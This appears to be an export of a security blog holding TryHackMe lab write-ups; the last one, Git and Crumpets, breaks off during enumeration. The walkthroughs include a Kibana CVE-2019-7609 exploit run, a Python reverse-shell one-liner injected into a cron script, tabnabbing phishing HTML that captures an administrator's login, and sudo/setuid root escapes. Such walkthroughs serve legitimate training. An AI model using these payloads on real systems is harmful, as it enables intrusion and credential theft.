[{"content":"ItsyBitsy is a medium difficulty room from tryhackme which involves using Kibana to examine the network connection logs of a suspicious user, find the link and the content of the file, and answer the questions.\nRoom Difficulty Medium Room Link https://tryhackme.com/room/itsybitsy Creator Dex01 Task 1 : Introduction In this challenge room, we will take a simple challenge to investigate an alert by IDS regarding a potential C2 communication.\nUsername: Admin\nPassword: elastic123\nTask 2 : Scenario - Investigate a potential C2 communication alert Scenario During normal SOC monitoring, Analyst John observed an alert on an IDS solution indicating a potential C2 communication from a user Browne from the HR department. A suspicious file was accessed containing a malicious pattern THM:{ ________ }. A week-long HTTP connection logs have been pulled to investigate. Due to limited resources, only the connection logs could be pulled out and are ingested into the connection_logs index in Kibana.\nOur task in this room will be to examine the network connection logs of this user, find the link and the content of the file, and answer the questions.\nHow many events were returned for the month of March 2022? Adjust the time filter to show the events that happended between March 1 to March 31\nNumber of events - 1482\nWhat is the IP associated with the suspected user in the logs? In the fields pane click on source_ip to view the IP addresses associated with the logs. We can\u0026rsquo;t tell which IP is associated with the suspected user.\nThe second IP has fewer logs . Lets create a filter to view logs which pertain only to that IP address.\n_index:connection_logs AND source_ip:192.166.65.54\nWe need to ensure if this is an C2C server. For that we can use Alienvault\u0026rsquo;s Malware C2C database.\nLink - https://otx.alienvault.com/pulse/5c76b2acd1420a1aac451307\nFrom the search result , we can see that the IP 104.23.99.198 is present in their database hence confirming our doubt.\nSo the source_ip which is associated with the suspected user is found.\nSource_ip of suspected user - 192.166.65.54\nThe user‚Äôs machine used a legit windows binary to download a file from the C2 server. What is the name of the binary? Query - _index:connection_logs AND user_agent:bitsadmin AND destination_ip : 104.23.99.190\nIn the Fields pane , click on user_agent field to view what user agent was used to download files, there are 2 results - Mozilla \u0026amp; bitsadmin.\nBITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress.\nAs seen before only 2 event\u0026rsquo;s traffic is related to that IP address in which both the user_agent is bitsadmin.\nThe infected machine connected with a famous filesharing site in this period, which also acts as a C2 server used by the malware authors to communicate. What is the name of the filesharing site? Query -\n_index:connection_logs AND user_agent:bitsadmin AND destination_ip :104.23.99.190 AND host: * where ,\nhost : * - represents any host. File sharing site - pastebin.com\nWhat is the full URL of the C2 to which the infected host is connected? The URI is /yTg0Ah6a\nFull URL - pastebin.com/yTg0Ah6a\nA file was accessed on the filesharing site. What is the name of the file accessed? Visiting pastebin.com/yTg0Ah6a gives us the name of the file,\nFilename - secret.txt\nThe file contains a secret code with the format THM{_____}. Secret code - THM{SEC****E}\n","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/itsybitsy/itsybitsy/","summary":"ItsyBitsy is a medium difficulty room from tryhackme which involves using Kibana to examine the network connection logs of a suspicious user, find the link and the content of the file, and answer the questions.\nRoom Difficulty Medium Room Link https://tryhackme.com/room/itsybitsy Creator Dex01 Task 1 : Introduction In this challenge room, we will take a simple challenge to investigate an alert by IDS regarding a potential C2 communication.\nUsername: Admin","title":"ItsyBitsy - THM"},{"content":"Kiba is a easy rated room from tryhackme where we exploit a prototype pollution vulnerability to gain a user shell \u0026amp; then escalate our privileges to root by exploiting a python3 binary which has setuid capabilities.\nRoom Kiba OS Linux Difficulty Easy Room Link https://tryhackme.com/room/kiba Creator stuxnet What is the vulnerability that is specific to programming languages with prototype-based inheritance? Vulnerability - Prototype Pollution\nWhat is the version of visualization dashboard installed in the server? Go to Management tab , there we can find the version of kiba that is running.\nVersion - 6.5.4\nWhat is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000 / A simple google search reveals the CVE number.\nCVE ID - CVE-2019-7609\nCompromise the machine and locate user.txt An python3 exploit for prototype pollution is available on github for kibana 6.5.4\nhttps://github.com/LandGrey/CVE-2019-7609 Run the Exploit\namrita22005client@ubuntu:~/kiba$ python3 exploit.py http://10.10.38.106:5601 10.17.45.3 4444 /home/amrita22005client/kiba/exploit.py:15: DeprecationWarning: The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives from distutils.version import StrictVersion [‚Ä¢] Kibana version identified: 6.5.4 [‚úì] Version is vulnerable [‚úì] Target seems vulnerable [‚úì] Exploit completed [‚ûú] Check your listener on 10.17.45.3:4444 We get our reverse shell \u0026amp; also the user.txt flag.\nshebut@ubuntu:~/kiba$ nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.38.106 48624 bash: cannot set terminal process group (945): Inappropriate ioctl for device bash: no job control in this shell To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. kiba@ubuntu:/home/kiba/kibana/bin$ id id uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) kiba@ubuntu:/home/kiba/kibana/bin$ cd ~ cd ~ kiba@ubuntu:/home/kiba$ cat user.txt cat user.txt THM{1s_*********_rce} Capabilities is a concept that provides a security system that allows \u0026ldquo;divide\u0026rdquo; root privileges into different values\nHow would you recursively list all of these capabilities? Command to list all capabilities - getcap -r /\nkiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2\u0026gt;/dev/null /home/kiba/.hackmeplease/python3 = cap_setuid+ep /usr/bin/mtr = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep Straightaway we can see that python3 has a suspicious path.\nWe can refer GTFOBINS to exploit the python binary which has setuid capabilities by runing the command python -c 'import os; os.setuid(0); os.system(\u0026quot;/bin/sh\u0026quot;)'\n# id uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) # cat /root/root.txt THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es} Now we have our root shell \u0026amp; our root.txt flag.\n","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/kiba/kiba/","summary":"Kiba is a easy rated room from tryhackme where we exploit a prototype pollution vulnerability to gain a user shell \u0026amp; then escalate our privileges to root by exploiting a python3 binary which has setuid capabilities.\nRoom Kiba OS Linux Difficulty Easy Room Link https://tryhackme.com/room/kiba Creator stuxnet What is the vulnerability that is specific to programming languages with prototype-based inheritance? Vulnerability - Prototype Pollution\nWhat is the version of visualization dashboard installed in the server?","title":"Kiba - THM"},{"content":"Napping is a medium difficulty box from TryHackMe which had a interesting vulnerability called Tab Nabbing to phish the admin of the website to get user daniel\u0026rsquo;s credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root.\nRoom Napping OS Linux Difficulty Medium Room Link https://tryhackme.com/room/nappingis1337 Creator hadrian3689 Enumeration Portscan ‚îÄ‚îÄ(rootüíÄkali)-[~/thm/napping] ‚îî‚îÄ# rustscan -a 10.10.247.40 -- -sV -sC -oN napping.nmap .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.üê¢ Nmap scan report for 10.10.247.40 Host is up, received reset ttl 63 (0.24s latency). Scanned at 2022-03-23 06:39:55 EDT for 13s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 85:f3:f5:b4:8c:24:1e:ef:6f:28:42:33:7c:2a:22:b4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmgxcZKHEVEbLHxkmo/bjXYP9qMuWYGmbV0Tl/maOUcfyhPcPPcl2S/RzgKgfWR5MBUit4/iD+LBbKvIqv5NsXAMjUFaC35mXLRrEhUXSP4pfcaWGzKARRJ4C9eUHJ1aT/vhU0ZNnhOW1H8Ig+btzcIqeiQJiKH+iGySyTsXJ3qLOAcQ4qwGKfdpnPtN3MYG7Ba6etdN4J+FVm/tjcUxE76ZKv5IdN+iOeTwBhKhk8lTPf6G8S7X2jx38deqAI6j20UBAnlFdfSjVrbavfzoeyAKODpzmgQ0J/VFWIZGqqMxg/Hq6KChT67DTMxrnfN7wojS2/fItjIpsvjTxlxhiHSvi+57ngJlPYKbiqU4P1nbxSB+eyy0UK44ln6MbLpCcRkvwOP87VOvfII4TfXostq94fYRW8G7oszKGFrucQdYoVTFhKgYveKe0np4eGG/GdPefDbLp5VoNTjs7WBDSxn5jY+0A/IY1/EjuaGlQvpk5IxDbU/mYm9bPeSYdAWgk= | 256 c2:7b:a9:0c:28:7c:d1üíø03:23:f4:a8:bc:02:72:4b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBP4j+pg12EElUiOMAVpEuqFCympfDuyyZ7McBGxU9lCp4qMOGKShc96y4656MSnAZu7ofMx9DyO1sDwcfbI3MQ= | 256 fe:92:00:b4:ee:5e:5a:92:52:90:9f:5e:0b:fd:61:a3 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0X6D1WGTnXedsm4aFXKIEt6iY22msqmq2QvKPW3VXM 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds So there are 2 ports running\n-\u0026gt; 22 - OpenSSH 8.2p1\n-\u0026gt; 80- Apache httpd 2.4.41\nWebsite - port 80 The webpage had just a simple login \u0026amp; sign up page.\nlogin page - signup page - I tried default credentials, basic sql injection but those didn\u0026rsquo;t work so I quickly went on to create an account \u0026amp; logged into the site.\nWe were greeted with a welcome.php page where we could submit a blog link \u0026amp; as the site says the blog link which we submitted will be reviewed by the admin.\nWhen I entered my website link ,it is displayed back for us to review it.\nOnce clicked it will open the link we submitted in a new tab.\nDirectory bruteforce ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/napping] ‚îî‚îÄ# feroxbuster -u http://10.10.247.40/ -w /usr/share/wordlists/dirb/common.txt -x php -C 403 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher ü§ì ver: 2.5.0 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ Target Url ‚îÇ http://10.10.247.40/ üöÄ Threads ‚îÇ 50 üìñ Wordlist ‚îÇ /usr/share/wordlists/dirb/common.txt üëå Status Codes ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí¢ Status Code Filters ‚îÇ [403] üí• Timeout (secs) ‚îÇ 7 ü¶° User-Agent ‚îÇ feroxbuster/2.5.0 üíâ Config File ‚îÇ /etc/feroxbuster/ferox-config.toml üí≤ Extensions ‚îÇ [php] üèÅ HTTP methods ‚îÇ [GET] üîÉ Recursion Depth ‚îÇ 4 üéâ New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ Press [ENTER] to use the Scan Management Menu‚Ñ¢ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 301 GET 9l 28w 312c http://10.10.247.40/admin =\u0026gt; http://10.10.247.40/admin/ 200 GET 1l 0w 1c http://10.10.247.40/config.php 200 GET 0l 0w 0c http://10.10.247.40/admin/config.php 200 GET 38l 82w 1211c http://10.10.247.40/index.php 302 GET 0l 0w 0c http://10.10.247.40/logout.php =\u0026gt; index.php 200 GET 38l 76w 1158c http://10.10.247.40/admin/login.php 302 GET 0l 0w 0c http://10.10.247.40/admin/logout.php =\u0026gt; login.php 200 GET 42l 104w 1567c http://10.10.247.40/register.php 302 GET 0l 0w 0c http://10.10.247.40/welcome.php =\u0026gt; index.php 302 GET 0l 0w 0c http://10.10.247.40/admin/welcome.php =\u0026gt; login.php [####################] - 49s 18452/18452 0s found:10 errors:0 So we have some interesting directories /admin \u0026amp; /admin/login.php\nThe /admin directory showed 403 but we were able to access the admin login page which is at /admin/login.php\nforbidden page - admin login page - Shell as daniel Tab Nabbing After this I was stuck for a while then I decided to google the name of the room like - \u0026ldquo;napping exploit\u0026rdquo; \u0026amp; then I got many results which was about Tab nabbing - a web vulnerability which may cause a phishing attack .\nTAB NABBING: Reverse tabnabbing, or simply tabnabbing, is a phishing attack in which an attacker fools a victim into entering their credentials on a fake website controlled by the attacker\nReverse tabnabbing attacks are possible on websites that enable users to post links that, when clicked, open in a new tab. The link is opened in a new tab because of the link‚Äôs target=\u0026quot;_blank\u0026quot; property.\nA regular way to abuse this behaviour would be to change the location of window.opener.location = https://attacker.com/victim.html to a web controlled by the attacker that looks like the original one, so it can imitate the login form of the original website and ask for credentials to the user.\nYou could read more on how to exploit it here -\u0026gt; Hacktricks\nSo the idea here is by using Tab Nabbing we could post a malicious link pointing to a fake admin login page of the website from our end, assuming that when the admin clicks on our link, he will get redirected to a new tab which has the fake admin login page of ours and enter his credentials thinking that he had accidentally logged out .\nSteps Create a file called malicious.html with the following contents \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.opener.location = \u0026#34;http://\u0026lt;attacker-ip\u0026gt;:8000/phishing.html\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; This will redirect the user who clicks it to the phishing.html page in a new tab.\nCopy the source code of admin login page and save it as phishing.html which will trick the admin to enter his credentials. \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Login\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body{ font: 14px sans-serif; } .wrapper{ width: 360px; padding: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;wrapper\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Admin Login\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Please fill in your credentials to login.\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;/admin/login.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Username\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; class=\u0026#34;form-control \u0026#34; value=\u0026#34;\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;invalid-feedback\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Password\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; class=\u0026#34;form-control \u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;invalid-feedback\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; Serve those files by spinning up a web server - python3 -m http.server 8000\nSubmit the link http://\u0026lt;attacker-ip\u0026gt;:8000/malicious.html in the website.\nRun wireshark to capture tun0 packets\nNow all we have to do is to wait for 2-3 mins for the admin to fall in our trap! kekw\nAfter few mins I got requests from the server for both of the fake html pages I created which essentially means the admin did visit our fake login page!\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/napping] ‚îî‚îÄ# python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.194.37 - - [24/Mar/2022 04:13:54] \u0026#34;GET /malicious.html HTTP/1.1\u0026#34; 200 - 10.10.194.37 - - [24/Mar/2022 04:13:54] \u0026#34;GET /phishing.html HTTP/1.1\u0026#34; 200 - 10.10.194.37 - - [24/Mar/2022 04:13:55] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) Interesting thing to see here is that there is a POST request sent back to us. Lets check wireshark for more information about that .\nRight click on the POST request and select Follow -\u0026gt; TCP stream\nYay we got a username called daniel \u0026amp; his password.\nUsing the credentials I was able to SSH in to machine as daniel .\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/napping] ‚îî‚îÄ# ssh daniel@10.10.194.37 The authenticity of host \u0026#39;10.10.194.37 (10.10.194.37)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:JofRko6/RC6xnBRFyh6aSMX+ospLetfcod6d05kXQQU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.194.37\u0026#39; (ED25519) to the list of known hosts. daniel@10.10.194.37\u0026#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 24 Mar 2022 05:50:13 AM UTC System load: 0.0 Processes: 113 Usage of /: 56.9% of 8.90GB Users logged in: 0 Memory usage: 60% IPv4 address for eth0: 10.10.194.37 Swap usage: 0% 10 updates can be applied immediately. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Wed Mar 16 00:41:48 2022 from 10.0.2.26 daniel@napping:~$ id uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators) We are a part of administrators group\nThere are 3 users on the machine root, daniel \u0026amp; adrian\nShell as adrian daniel@napping:/home/adrian$ cat /etc/passwd | grep bash root‚ùå0:0:root:/root:/bin/bash adrian‚ùå1000:1000:adrian:/home/adrian:/bin/bash daniel‚ùå1001:1001::/home/daniel:/bin/bash We need to escalate our privileges to adrian to get the user flag.\nPoking around the machine I found config.php at /var/www/html which had username \u0026amp; a password\ndaniel@napping:/var/www/html$ cat config.php \u0026lt;?php /* Database credentials. Assuming you are running MySQL server with default setting (user \u0026#39;root\u0026#39; with no password) */ define(\u0026#39;DB_SERVER\u0026#39;, \u0026#39;localhost\u0026#39;); define(\u0026#39;DB_USERNAME\u0026#39;, \u0026#39;adrian\u0026#39;); define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Stop@Napping3!\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;website\u0026#39;); . . . With the help of these credentials I was able to login to mysql@localhost but found nothing quite interesting there.\nVisiting the home dir of adrian,\ndaniel@napping:/home/adrian$ ls -al total 44 drwxr-xr-x 4 adrian adrian 4096 Mar 24 06:00 . drwxr-xr-x 4 root root 4096 Mar 15 23:28 .. lrwxrwxrwx 1 root root 9 Mar 16 00:39 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 adrian adrian 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 adrian adrian 3771 Feb 25 2020 .bashrc drwx------ 2 adrian adrian 4096 Mar 15 23:28 .cache lrwxrwxrwx 1 root root 9 Mar 16 00:40 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 adrian adrian 807 Feb 25 2020 .profile -rw-rw-r-- 1 adrian administrators 480 Mar 16 00:02 query.py -rw-rw-r-- 1 adrian adrian 75 Mar 16 00:38 .selected_editor -rw-rw-r-- 1 adrian adrian 224 Mar 24 06:06 site_status.txt drwx------ 2 adrian adrian 4096 Mar 15 23:27 .ssh -rw-r--r-- 1 adrian adrian 0 Mar 15 23:28 .sudo_as_admin_successful -rw-r----- 1 root adrian 56 Mar 16 00:33 user.txt -rw------- 1 adrian adrian 0 Mar 16 00:40 .viminfo We have the user.txt her. We can view and edit the query.py file since we are a part of administrators group.\nosquery.py\nfrom datetime import datetime import requests now = datetime.now() r = requests.get(\u0026#39;http://127.0.0.1/\u0026#39;) if r.status_code == 200: f = open(\u0026#34;site_status.txt\u0026#34;,\u0026#34;a\u0026#34;) dt_string = now.strftime(\u0026#34;%d/%m/%Y %H:%M:%S\u0026#34;) f.write(\u0026#34;Site is Up: \u0026#34;) f.write(dt_string) f.write(\u0026#34;\\n\u0026#34;) f.close() else: f = open(\u0026#34;site_status.txt\u0026#34;,\u0026#34;a\u0026#34;) dt_string = now.strftime(\u0026#34;%d/%m/%Y %H:%M:%S\u0026#34;) f.write(\u0026#34;Check Out Site: \u0026#34;) f.write(dt_string) f.write(\u0026#34;\\n\u0026#34;) f.close() The site_status.txt file hints that this script might be running in the background every minute.\nsite_status.txt\ndaniel@napping:/home/adrian$ cat site_status.txt Site is Up: 24/03/2022 06:31:01 Site is Up: 24/03/2022 06:32:02 Site is Up: 24/03/2022 06:33:01 Site is Up: 24/03/2022 06:34:02 Site is Up: 24/03/2022 06:35:01 Site is Up: 24/03/2022 06:36:02 Site is Up: 24/03/2022 06:37:01 Site is Up: 24/03/2022 06:38:02 Site is Up: 24/03/2022 06:39:01 Lets add a python reverse shell oneliner at the end of the osquery.py script.\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;ip\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;bash\u0026#34;) user.txt üö© After a minute we got a reverse shell back as adrian. Go ahead and grab the user.txt üö©\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[/opt/peas] ‚îî‚îÄ# nc -lvnp 9001 127 ‚®Ø Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::9001 Ncat: Listening on 0.0.0.0:9001 Ncat: Connection from 10.10.35.41. Ncat: Connection from 10.10.35.41:46982. adrian@napping:~$ id uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators) adrian@napping:~$ cat user.txt THM{Wh@T_1S_*******PriViL36E} Shell as root Running sudo -l reveals that we could run vim as root.\nadrian@napping:~$ sudo -l Matching Defaults entries for adrian on napping: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User adrian may run the following commands on napping: (root) NOPASSWD: /usr/bin/vim root.txt üö© We refer GTFOBINS to check sudo entry for vim.\nRun sudo /usr/bin/vim -c ':!/bin/sh' to obtain root shell . Grab the root.txt flag üéâ\n# id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt THM{Adm1n$__******tsk_tSK} ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/","summary":"Napping is a medium difficulty box from TryHackMe which had a interesting vulnerability called Tab Nabbing to phish the admin of the website to get user daniel\u0026rsquo;s credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root.","title":"Napping - THM"},{"content":"Git and Crumpets is a medium difficulty box from tryhackme which is mostly based on git. We get a shell on the box using a CVE in gitea\u0026rsquo;s git hooks functionality .For root, we change the permissions of the git user to root user. Now we were able to see a private repository owned by root which had root user\u0026rsquo;s ssh private key through which we login as root to get the root flag.\nRoom Git and Crumpets OS Linux Difficulty Medium Room Link https://tryhackme.com/room/gitandcrumpets Creator hydragyrum Enumeration Portscan ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/gitsandcrumpets] ‚îî‚îÄ# nmap -sCV 10.10.234.147 -oN gitsandcrumpets.nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-09 10:01 EST Nmap scan report for 10.10.234.147 Host is up (0.35s latency). Not shown: 953 filtered tcp ports (no-response), 44 filtered tcp ports (admin-prohibited) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http nginx | http-title: Hello, World |_Requested resource was http://10.10.234.147/index.html 9090/tcp closed zeus-admin Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 91.94 seconds Website - port 80 After the nmap scan I couldn\u0026rsquo;t access the webpage .Initially I thought it might be some vpn issues. Later I got to know that fail2ban was used. So no more bruteforcing attempts!\nFail2Ban is an intrusion prevention software framework that protects computer servers from brute-force attacks. Fail2ban scans log files (e.g. /var/log/apache/error_log) and bans IPs that show the malicious signs \u0026ndash; too many password failures\nThe nmap results show that the machine ip is getting redirected to http://10.10.234.147/index.html .There was nothing quite interesting here.\nSearching for /robots.txt or any other directories leads to Rick Roll youtube video .\nWe couldn\u0026rsquo;t find any dirctories \u0026amp; there was pretty much nothing we could do here but using curl to retrieve the contents of the webpage reveals the following.\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/gitsandcrumpets] ‚îî‚îÄ# curl 10.10.174.224 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Go away!\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt;Nothing to see here, move along\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;Notice:\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt; Hey guys, I set up the dev repos at git.git-and-crumpets.thm, but I haven\u0026#39;t gotten around to setting up the DNS yet. In the meantime, here\u0026#39;s a fun video I found! Hydra \u0026lt;/p\u0026gt; \u0026lt;pre\u0026gt; iiiii*nMMWWWWW@@@@@WWWWW@@@@@@@@@WnnxxnnnnnnnnnxxxMMW@@@@@@@@@@@@@@@WWWW@WW@WMMz*iiiiiiiiiiiiii;iiiiiiiiiiii ;;;;;;;;;;;;;iiiiiii;;;;;;;;;;i;;;;;;;;;;iiiiii+xMMWWWWW@@@@@WWWWWW@@@@@@@@WxnMMMMMMxMMMMMWWWWWW@@@@@@@@@@@@@@@WWWWWW@WMx#*iiiiiiiiiiiiiiiiiiiiiiiiiii ;;;;;;;;;;;;iiiiiii;;;;;;;;;;;;;;;;ii;;;;iiiiii#xxMMWWWW@@@@@WWWWWW@@@@@@@WWnxxxnnxxxxxxxxxxxMWW@@@@@@@@@@@@@@@@WWWWW@WMx+iiiiiiiiiiiiiiiiiiiii;iiiiii 